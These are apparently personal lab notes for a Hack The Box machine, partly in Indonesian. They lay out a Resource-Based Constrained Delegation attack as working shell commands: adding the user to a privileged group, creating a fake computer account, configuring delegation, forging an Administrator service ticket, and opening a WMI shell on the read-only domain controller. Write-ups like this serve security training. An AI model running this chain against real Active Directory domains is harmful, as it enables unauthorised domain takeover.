Resource-Based Constrained Delegation

![](Attachments/Pasted%20image%2020260807151859.png)

# menambahkan diri sendiri ke group RODC administrator
```shell
bloodyad -u l.wilson_adm -p 'YourNewPass123!' -d garfield.htb --host 10.129.244.207 add groupMember "RODC Administrators" l.wilson_adm
```
![](Attachments/Pasted%20image%2020260811101539.png)
# create fake computer
```shell
impacket-addcomputer -computer-name 'FAKEMACHINE' -computer-pass 'FAKEMACHINE123!' -dc-ip 10.129.244.207 'garfield.htb/l.wilson_adm:YourNewPass123!'
```
![](Attachments/Pasted%20image%2020260811101509.png)
# configure delegation
```shell
impacket-rbcd -action write -delegate-from 'FAKEMACHINE$' -delegate-to 'RODC01$' -dc-ip 10.129.244.207 'garfield.htb/l.wilson_adm:YourNewPass123!'
```
![](Attachments/Pasted%20image%2020260811101452.png)
# request service ticket
```shell
impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -altservice host -dc-ip 10.129.244.207 'garfield.htb/FAKEMACHINE$:FAKEMACHINE123!'
```
![](Attachments/Pasted%20image%2020260811101428.png)

# Login di komputer RODC
```shell
# export
export KRB5CCNAME=Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache

# Login   
impacket-wmiexec -k -no-pass -dc-ip 10.129.244.207 garfield.htb/Administrator@RODC01.garfield.htb
```
![](Attachments/Pasted%20image%2020260811153352.png)